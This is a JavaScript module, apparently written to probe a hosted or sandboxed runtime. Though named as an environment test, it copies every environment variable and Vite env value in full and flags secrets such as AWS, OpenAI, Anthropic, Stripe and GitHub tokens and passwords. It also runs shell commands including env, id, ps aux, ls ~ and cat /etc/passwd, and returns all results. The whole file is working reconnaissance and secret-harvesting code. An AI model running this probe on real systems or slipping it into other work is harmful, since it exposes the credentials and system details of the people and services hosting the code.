// env-test.mjs
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export async function testEnvironmentAccess() {
  const results = {
    canAccessProcessEnv: false,
    envVariables: {},
    sensitiveKeys: [],
    viteEnvAccess: {},
    canExecuteCommands: false,
    systemEnv: {},
    commandResults: {},
    sensitiveSystemKeys: [],
    timestamp: new Date().toISOString(),
    totalEnvVars: 0,
    errors: {}
  };

  try {
    // Попытка доступа к process.env
    if (typeof process !== "undefined" && process.env) {
      results.canAccessProcessEnv = true;
      results.envVariables = { ...process.env };
      results.totalEnvVars = Object.keys(process.env).length;
      
      // Поиск чувствительных переменных
      const sensitivePatterns = [
        "PASSWORD", "SECRET", "KEY", "TOKEN", "API_KEY", 
        "DATABASE", "DB_", "MONGO", "REDIS", "AWS_", 
        "OPENAI", "ANTHROPIC", "GOOGLE", "STRIPE", "GITHUB",
        "SSH", "AUTH", "HOME", "USER", "SUDO"
      ];
      
      results.sensitiveKeys = Object.keys(process.env)
        .filter(key => sensitivePatterns.some(pattern => 
          key.toUpperCase().includes(pattern)
        ));
    }
  } catch (e) {
    results.processError = e.message;
  }

  try {
    // Проверка Vite env переменных
    if (typeof import.meta !== "undefined" && import.meta.env) {
      results.viteEnvAccess = { ...import.meta.env };
    }
  } catch (e) {
    results.viteError = e.message;
  }

  // Попытка выполнения системных команд
  const commands = {
    env: 'env',
    whoami: 'whoami',
    pwd: 'pwd',
    id: 'id',
    uname: 'uname -a',
    ps: 'ps aux | head -5',
    ls_home: 'ls -la ~/',
    cat_passwd: 'cat /etc/passwd | head -3'
  };

  for (const [name, command] of Object.entries(commands)) {
    try {
      const { stdout, stderr } = await execAsync(command);
      results.canExecuteCommands = true;
      results.commandResults[name] = {
        stdout: stdout.trim(),
        stderr: stderr.trim(),
        success: true
      };
    } catch (error) {
      results.errors[name] = error.message;
      results.commandResults[name] = {
        error: error.message,
        success: false
      };
    }
  }

  // Парсинг системных переменных окружения
  if (results.commandResults.env?.success) {
    const envLines = results.commandResults.env.stdout.split('\n');
    envLines.forEach(line => {
      const [key, ...valueParts] = line.split('=');
      if (key && valueParts.length > 0) {
        results.systemEnv[key] = valueParts.join('=');
      }
    });

    // Поиск чувствительных системных переменных
    const sensitivePatterns = [
      'PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'AUTH',
      'DATABASE', 'DB_', 'MONGO', 'REDIS', 'AWS_', 'GOOGLE',
      'OPENAI', 'ANTHROPIC', 'STRIPE', 'GITHUB', 'SSH',
      'HOME', 'USER', 'PATH', 'SHELL', 'SUDO'
    ];

    results.sensitiveSystemKeys = Object.keys(results.systemEnv)
      .filter(key => sensitivePatterns.some(pattern => 
        key.toUpperCase().includes(pattern)
      ));
  }

  return results;
}